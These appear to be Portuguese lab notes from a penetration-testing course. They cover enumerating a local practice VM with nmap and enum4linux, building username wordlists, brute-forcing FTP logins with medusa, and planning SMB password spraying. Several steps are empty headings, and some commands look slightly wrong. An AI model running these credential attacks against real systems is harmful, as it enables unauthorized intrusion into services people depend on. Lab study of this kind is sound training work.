Listar IP do equipamentos

Executar o comando **Ip a**   - lista o ip do equipamentos 192.168.56.101

Realizar o **ping  192.168.56.101** 



Iniciar a Enumeração 

No terminal executar **nmap -sV -p 21,22,80,445,139 192.168.56.101**



Testar o acesso ao ftp para saber se o serviço esta ativo 



Criando arquivo com usuários para invasão  -  **echo -p 'user\\nmsfadmin\\nadmin\\nroot' > users.txt**



Criando arquivo com senhas para invasao 



Ataque ao host -  **medusa -h  ip do host  -U users.txt -P pass.txt -M ftp -t 6** 



Validar o acesso de ftp  



Criando wordlist para ataque aos sites

**echo -p 'user\\nmsfadmin\\nadmin\\nroot' > users.txt repetir o cenário para uma de senhas**



ATAQUE EM CADEIA + PASSWORDSPRAY + ENUMERACAO 



ATAQUE A UM SERVIÇO DE SMB = Descobrir usuario e testar acesso por sprayng (teste de 1 senha com varios usuario) ataque silecioso



Comando de enumeracao = **enum4linux -A iphost | tee enum4\_output.txt**





Criar worlist de usuarios 



Ataque servidor smb 





